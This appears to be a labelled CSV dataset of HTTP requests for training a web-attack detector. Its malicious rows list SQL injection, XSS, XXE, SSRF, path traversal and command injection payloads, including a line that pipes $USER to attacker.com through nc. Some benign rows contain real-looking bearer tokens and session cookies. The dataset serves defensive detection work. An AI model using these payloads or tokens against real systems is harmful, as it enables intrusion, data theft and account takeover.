method,path,query,headers,body,ua,label
GET,/web-api/orders/e94e7b48-ac00-4070-9c2a-7e00f22f2868,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzI1NjUzODAiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiZjI0MzdhMGYtNzBiNy00MmY5LTlkMzEtMzFkOWU5YjdkZDI3IiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzI1NjUzODAiLCJzdWIiOiJXRUJTSVRFQDA3NzI1NjUzODAiLCJpYXQiOjE3NzA2MzAyODMsImV4cCI6MTc3MTIzNTA4M30.l33bNIXtG4KLinC4o8F8v_VegMYejyUnl01fFeHiUoY; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: 9a42f738-a297-46e3-af6f-983e0e3d5f0b",,python-requests/2.32.5,0
GET,/,,POST /webhooks/stripe (Payment Success),,,0
GET,/,,id=0x27204f52202731273d2731,,,1
GET,/,,"POST /legal/tos/accept {""version"": ""2.1.0""}",,,0
GET,/,,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,1
GET,/,,GET /search?q=C%23,,,0
GET,/,,%0d%0a* CAPABILITY,,,1
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
PUT,/profile,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,url=http://malicious.com,,,1
POST,/web-api/orders/260209PCYBSAGKM/paymentUrl,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3Nzg5OTE5ODgiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiNjY0OTI2NzktNWRkNi00NDE2LWI4YjAtYjAzNmQxZmUxNjMwIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3Nzg5OTE5ODgiLCJzdWIiOiJXRUJTSVRFQDA3Nzg5OTE5ODgiLCJpYXQiOjE3NzA2MzAyMTksImV4cCI6MTc3MTIzNTAxOX0.yBAbuBQMIEkTWYsV3V-cA3SvgsL_Xzgn73qR4psYRWA; Connection: keep-alive; Content-Length: 2; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: 325e334f-c496-4deb-8382-912a35c81998",,python-requests/2.32.5,0
GET,/,,"PUT /billing/address {""street"": ""123 Main St"", ""city"": ""Hanoi""}",,,0
GET,/,,expect://id,,,1
GET,/,,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
GET,/,,http://attacker.com/shell.txt,,,1
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,GET /api/v1/search/suggest?q=secur,,,0
GET,/,,GET /health,,,0
GET,/,,Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,1
GET,/,,{{7*7}}{{ '7'*7 }},,,1
GET,/,,rmi://attacker.com:1099/Exploit,,,1
GET,/,,%0d%0a* CAPABILITY,,,1
GET,/,,<svg/onload=alert(1)>,,,1
GET,/,,GET /search?q=security,,,0
GET,/,,php://filter/convert.base64-encode/resource=index.php,,,1
GET,/,,%0als,,,1
GET,/,,GET /downloads/guide-v2.pdf,,,0
GET,/,,GET /dashboard?view=summary&time=30d,,,0
GET,/,,php://input,,,1
GET,/,,OPTIONS /api/v1/data,,,0
GET,/,,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>",,,1
GET,/,,%253cscript%253ealert(1)%253c/script%253e,,,1
GET,/,,GET /user/orders?status=shipped&from=2025-01-01,,,0
GET,/,,"POST /api/v1/payment/tokens {""card_last4"": ""4242""}",,,0
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,//////////////////etc/passwd,,,1
GET,/,,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,1
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,1
DELETE,/api/v1/users,,Host: example.com; Accept: */*,input=<img src=x onerror=alert(1)>,Nikto/2.1.6,1
GET,/,,%253cscript%253ealert(1)%253c/script%253e,,,1
GET,/,,"{""name"": ""__import__('os').system('id')""}",,,1
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,id=0x27204f52202731273d2731,,,1
GET,/favicon.ico,,,,,0
DELETE,/api/v1/orders,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,"<iframe src=""https://target.com"" style=""opacity:0.5""></iframe>",,,1
GET,/,,"POST /contact (name, email, message)",,,0
GET,/,,"POST /api/v1/posts/55/comments {""text"": ""Great article!""}",,,0
GET,/,,%0d%0aBcc: victim@example.com,,,1
GET,/,,id=1; DROP TABLE users--,,,1
GET,/,,"POST /api/v1/sync/video {""id"": ""v_123"", ""position"": 450}",,,0
DELETE,/search,,Host: example.com; Accept: */*,input=admin'--,sqlmap/1.5.2,1
GET,/,,"{""$where"": ""function() { return this.name == 'admin' }""}",,,1
GET,/,,..%c0%af..%c0%af..%c0%afetc/passwd,,,1
GET,/,,`uname -a`,,,1
GET,/,,<body onload=alert(1)>,,,1
GET,/,,"{""alg"":""none""}",,,1
GET,/,,..\..\..\..\windows\system32\config\sam,,,1
GET,/,,"POST /contact (name, email, message)",,,0
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
GET,/,,"<svg><script xlink:href=""http://attacker.com/xss.js""></script></svg>",,,1
GET,/,,[Binary Frame] 0x89 (Ping),,,0
GET,/,,"POST /contact (name, email, message)",,,0
GET,/,,id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--,,,1
PUT,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,"POST /wishlist/add {""item_id"": ""it_888""}",,,0
GET,/,,GET /api/v1/locale/set?lang=en,,,0
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/,,url=http://malicious.com,,,1
GET,/,,GET /static/icons/heart.svg,,,0
GET,/,,"POST /team/invite {""email"": ""colleague@work.com""}",,,0
GET,/,,GET /stream/audio/segment_77.aac,,,0
GET,/,,..\..\..\..\windows\system32\config\sam,,,1
GET,/,,GET /maps/v2/tile/10/512/324.png,,,0
GET,/,,GET /health,,,0
GET,/,,"POST /reviews {""id"": ""p_50"", ""stars"": 5, ""comment"": ""Amazing quality!""}",,,0
GET,/favicon.ico,,,,,0
PUT,/cart,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,$(whoami),,,1
GET,/,,query { __schema { types { name } } },,,1
GET,/,,"<iframe srcdoc=""<script>alert(1)</script>"">",,,1
GET,/,,GET /newsletter/unsubscribe?token=abc123def456,,,0
GET,/,,"POST /team/invite {""email"": ""colleague@work.com""}",,,0
GET,/,,GET /api/v1/support/tickets/404/attachments,,,0
GET,/,,GET /downloads/guide-v2.pdf,,,0
DELETE,/cart,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,"#set($str=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id""))",,,1
GET,/,,GET /api/v1/map/data?lat=21.0285&lng=105.8542&zoom=15,,,0
GET,/,,phar://path/to/malicious.phar/shell.php,,,1
GET,/,,javascript:alert(1),,,1
DELETE,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,GET /podcasts/latest.xml,,,0
GET,/,,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,,1
GET,/,,Host: evil.com,,,1
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
GET,/,,<script>alert('XSS')</script>,,,1
GET,/,,GET /checkout/step1,,,0
GET,/,,../../../../etc/passwd%00,,,1
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,,1
GET,/,,GET /api/v1/search/suggest?q=secur,,,0
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
GET,/,,<script>alert('XSS')</script>,,,1
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/,,"POST /legal/tos/accept {""version"": ""2.1.0""}",,,0
GET,/,,GET /images/hero-banner.webp,,,0
GET,/,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,,1
GET,/,,"[{""query"": ""...""}, {""query"": ""...""}]",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /images/hero-banner.webp,,,0
GET,/,,GET /api/v1/products,,,0
GET,/,,| id,,,1
GET,/,,OPTIONS /api/v1/data,,,0
GET,/,,Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,1
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
GET,/,,GET /admin/reports/sales.csv?year=2025,,,0
GET,/,,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
GET,/,,expect://id,,,1
GET,/,,id=1&id=2,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,[Binary Frame] 0x89 (Ping),,,0
GET,/,,GET /manifest.json,,,0
DELETE,/products,id=123,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,GET /newsletter/unsubscribe?token=abc123def456,,,0
GET,/,,"PUT /billing/address {""street"": ""123 Main St"", ""city"": ""Hanoi""}",,,0
GET,/,,POST /api/v1/user/avatar (multipart/form-data),,,0
GET,/,,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>",,,1
GET,/,,GET /maps/v2/tile/10/512/324.png,,,0
GET,/,,GET /images/logo.png,,,0
GET,/,,php://filter/convert.base64-encode/resource=index.php,,,1
GET,/,,phar://path/to/malicious.phar/shell.php,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,${os.system('id')},,,1
GET,/,,expect://id,,,1
GET,/,,GET /search?q=C%23,,,0
GET,/favicon.ico,,,,,0
GET,/,,"{""name"": ""__import__('os').system('id')""}",,,1
GET,/,,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,1
GET,/favicon.ico,,,,,0
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
GET,/,,"{""alg"":""none""}",,,1
PUT,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,GET /stores/find?zip=10001&distance=10,,,0
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /stream/audio/segment_77.aac,,,0
GET,/,,java\tscript:alert(1),,,1
GET,/,,php://filter/convert.base64-encode/resource=index.php,,,1
GET,/,,"<iframe src=""https://target.com"" style=""opacity:0.5""></iframe>",,,1
GET,/,,<img src=x onerror=alert(1)>,,,1
GET,/,,"POST /team/invite {""email"": ""colleague@work.com""}",,,0
GET,/,,GET /api/v1/products,,,0
GET,/,,`uname -a`,,,1
GET,/,,GET /api/v1/map/data?lat=21.0285&lng=105.8542&zoom=15,,,0
GET,/,,GET /user/orders?status=shipped&from=2025-01-01,,,0
GET,/,,http://attacker.com/shell.txt,,,1
GET,/,,http://169.254.169.254/latest/meta-data/,,,1
GET,/,,GET /blog/future-of-ai-2026,,,0
GET,/,,GET /api/v1/products/101,,,0
POST,/api/v1/users,,Host: example.com; Accept: */*,"input="" onmouseover=alert(1) """,Nmap Scripting Engine,1
GET,/,,GET /user/orders?status=shipped&from=2025-01-01,,,0
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,../../../../etc/passwd,,,1
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,GET /static/icons/heart.svg,,,0
PUT,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,query { __schema { types { name } } },,,1
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/favicon.ico,,,,,0
GET,/,,http://attacker.com/shell.txt,,,1
GET,/,,id=1'/**/OR/**/'1'='1,,,1
GET,/,,DELETE /api/v1/notifications/1024,,,0
GET,/,,GET /admin/reports/sales.csv?year=2025,,,0
GET,/,,GET /stores/find?zip=10001&distance=10,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/api/v1/users,,Host: example.com; Accept: */*,input=..\..\..\windows\system32,sqlmap/1.5.2,1
GET,/,,Content-Length: 4\r\n\r\n1234,,,1
POST,/search,,Host: example.com; Accept: */*,input=' OR 'x'='x,sqlmap/1.5.2,1
GET,/,,"POST /api/v1/sync/video {""id"": ""v_123"", ""position"": 450}",,,0
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/,,"{""alg"":""none""}",,,1
GET,/,,%0d%0aBcc: victim@example.com,,,1
PUT,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,<script>alert('XSS')</script>,,,1
GET,/,,GET /locales/vi-VN.json,,,0
GET,/,,GET /locales/vi-VN.json,,,0
DELETE,/index.php,,Host: example.com; Accept: */*,input=; ls -la,Nikto/2.1.6,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
PUT,/login,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
POST,/products,id=123,Host: example.com; Accept: */*,username=user978&password=pass5,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,%0als,,,1
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,GET /feed/news.rss,,,0
POST,/api/v1/users,,Host: example.com; Accept: */*,input=' OR 'x'='x,curl/7.68.0,1
GET,/,,../../../../etc/passwd%00,,,1
GET,/,,GET /feed/news.rss,,,0
GET,/,,GET /,,,0
GET,/,,GET /sitemap.xml,,,0
GET,/,,id=1'/**/OR/**/'1'='1,,,1
GET,/,,%0d%0aBcc: victim@example.com,,,1
GET,/,,{smart_f_shell_exec('id')},,,1
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/favicon.ico,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /search?q=1+1=2,,,0
GET,/,,Host: evil.com,,,1
GET,/,,"POST /api/v1/posts/55/comments {""text"": ""Great article!""}",,,0
GET,/,,"#set($str=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id""))",,,1
GET,/,,(&(uid=admin)(|(password=*))),,,1
GET,/index.php,option=com_projectfork&section=../../../../../../../../etc/passwd,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",1
GET,/,,$(whoami),,,1
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
GET,/favicon.ico,,,,,0
GET,/,,GET /locales/vi-VN.json,,,0
GET,/,,; /bin/c?t /e*c/p?sswd,,,1
GET,/,,GET /config/app-settings.json,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"POST /analytics/metric {""event"": ""button_click"", ""label"": ""signup""}",,,0
GET,/,,id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,1
GET,/,,http://attacker.com/shell.txt,,,1
GET,/,,http://attacker.com/shell.txt,,,1
GET,/favicon.ico,,,,,0
GET,/,,GET /login,,,0
GET,/,,php://input,,,1
GET,/,,POST /cart/add?product_id=99,,,0
GET,/,,%0als,,,1
GET,/,,GET /feed/news.rss,,,0
GET,/,,GET /static/css/style.css,,,0
GET,/,,"POST /api/v1/projects {""name"": ""Security Audit 2026""}",,,0
GET,/,,GET /dashboard?view=summary&time=30d,,,0
GET,/,,GET /robots.txt,,,0
GET,/,,"POST /api/v1/projects {""name"": ""Security Audit 2026""}",,,0
POST,/blog/article-1,,Host: example.com; Accept: */*,username=user437&password=pass466,Mozilla/5.0 (Linux; Android 11),0
DELETE,/login,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,GET /search?q=machine+learning,,,0
GET,/,,GET /newsletter/unsubscribe?token=abc123def456,,,0
GET,/,,GET /sitemap.xml,,,0
GET,/,,"POST /team/invite {""email"": ""colleague@work.com""}",,,0
GET,/web-api/orders/278b3afc-517d-4d17-a04f-b6ae515d71d1,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzE4ODI2MzkiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiZDk2MTJiYjctYzUxMi00ZDkyLWJhZjQtMDEwYWQxNGQ5YTZlIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzE4ODI2MzkiLCJzdWIiOiJXRUJTSVRFQDA3NzE4ODI2MzkiLCJpYXQiOjE3NzA2MzAyMDksImV4cCI6MTc3MTIzNTAwOX0.fpaKrUynDTxr_odBH3tX5-l-pvAnRMcpDV6VAyElQxc; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: 9b5e3687-2407-47bd-9080-3ea6fa12888c",,python-requests/2.32.5,0
GET,/,,"POST /privacy/consent {""analytics"": true, ""marketing"": false}",,,0
GET,/,,"{""__proto__"": {""isAdmin"": true}}",,,1
DELETE,/admin,,Host: example.com; Accept: */*,input=<script>alert(1)</script>,curl/7.68.0,1
GET,/,,"POST /legal/tos/accept {""version"": ""2.1.0""}",,,0
GET,/,,GET /search?q=machine+learning,,,0
GET,/,,gzip compressed content with chosen prefix,,,1
GET,/,,GET /maps/v2/tile/10/512/324.png,,,0
GET,/,,PUT /api/v1/profile (JSON payload),,,0
GET,/,,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,1
POST,/home,,Host: example.com; Accept: */*,username=user941&password=pass779,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,phar://path/to/malicious.phar/shell.php,,,1
GET,/,,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
GET,/,,GET /search?q=security,,,0
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,..\..\..\..\windows\system32\config\sam,,,1
GET,/,,{{constructor.constructor('alert(1)')()}},,,1
GET,/,,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,1
GET,/,,(&(uid=admin)(|(password=*))),,,1
GET,/,,GET /manifest.json,,,0
GET,/,,url=http://malicious.com,,,1
GET,/,,"{""$where"": ""this.user == 'admin'""}",,,1
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,"POST /privacy/consent {""analytics"": true, ""marketing"": false}",,,0
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/,,phar://path/to/malicious.phar/shell.php,,,1
GET,/,,dict://localhost:11211/stat,,,1
GET,/,,DELETE /api/v1/notifications/1024,,,0
GET,/,,javascript:alert(1),,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /locales/vi-VN.json,,,0
GET,/admin,q=&& whoami,Host: example.com; Accept: */*,,sqlmap/1.5.2,1
POST,/index.php,,Host: example.com; Accept: */*,input=../../../../etc/passwd,Nikto/2.1.6,1
GET,/,,GET /locales/vi-VN.json,,,0
PUT,/products,id=123,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/favicon.ico,,,,,0
POST,/test-framework-api/node/node/sys-node/next-monitor/1770714881,,"Accept-Encoding: gzip, x-gzip, deflate; Authorization: Bearer eyJraWQiOiJMbHFRYVBsYXRmb3JtIiwiYWxnIjoiUlMyNTYifQ.eyJpc3MiOiJMbHFRYVBsYXRmb3JtIiwianRpIjoiZjhkOTkwYTMtZjBmNC00YzIyLThlODMtMGZiZGFjNDcxNzVmIiwic3ViIjoiY3R2LnRvYWluYUB2bnBheS52biIsImVtYWlsIjoiY3R2LnRvYWluYUB2bnBheS52biIsInRva2VuVHlwZSI6Ik5PREUiLCJpYXQiOjE3NzA2MDYwODJ9.OX2f6vxmO7aZE2h7nEGC5JEvHPQg9qPJSe93VjxMJP4yObbwpkpuOYuEfk5lEsZ3wNqsIjPBw7sWDwI-RD27f8l0ycNbaD2qW3kT7BJ2Ep4m4Eh4d30oH1kDNV0basl1Dsuc7RBghkMGFZ38gjob1fxgVovzJvYRvsLQcPjtjR7-xu6s9q3OG3VKbYMudUF1eR3cVmb60riUFOZIPHfvYs0LtB1ug8sccliyMBsPzDPFyjEgH4l1zs2EDrLX4RVyS19GaY5Yi5wZbC3gh6JU2d1lr-_BuY2sXapL0h-Ze3XGGCtz4lKVkBWtzK7bc6YBOm-84TjjbSZ6fo2CHx52Yw; Cache-Control: no-cache; Connection: keep-alive; Content-Length: 0; Cookie: __Host-grv_app_session_subject=25d414ce4e19fb923767051bca3457bc0ce24b5e64384f3f5c80b4067f1ead33; __Host-grv_app_session=12e25707e507ec830e4801957d83123d2f406ddaa3e7d9f41ff303acb2a241c3; Host: lqa.vnpaytest.vn; Node-Version: v1.0.0; User-Agent: Apache-HttpClient/5.4.1 (Java/17.0.4.1); X-Request-Id: d39d06b3-71e7-40d6-9e3d-6f7b1f5648e6",,Apache-HttpClient/5.4.1 (Java/17.0.4.1),0
GET,/,,..%252f..%252f..%252fetc%252fhosts,,,1
GET,/,,GET /blog/future-of-ai-2026,,,0
GET,/,,query { a: user(id:1) { name } b: user(id:2) { name } },,,1
GET,/favicon.ico,,,,,0
GET,/,,"POST /wishlist/add {""item_id"": ""it_888""}",,,0
GET,/,,GET /checkout/step1,,,0
GET,/,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,,1
GET,/,,"id=1 UNION SELECT null, user(), database()--",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,{{constructor.constructor('alert(1)')()}},,,1
GET,/,,..\..\..\..\windows\system32\config\sam,,,1
GET,/,,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,,1
GET,/,,__proto__[admin]=true,,,1
GET,/,,GET /dashboard?view=summary&time=30d,,,0
GET,/,,GET /fonts/inter-bold.woff2,,,0
POST,/search,,Host: example.com; Accept: */*,input=../../../../etc/passwd,curl/7.68.0,1
GET,/,,../../../../etc/passwd,,,1
GET,/,,..%2f..%2f..%2fetc%2fshadow,,,1
GET,/,,[Binary Frame] 0x89 (Ping),,,0
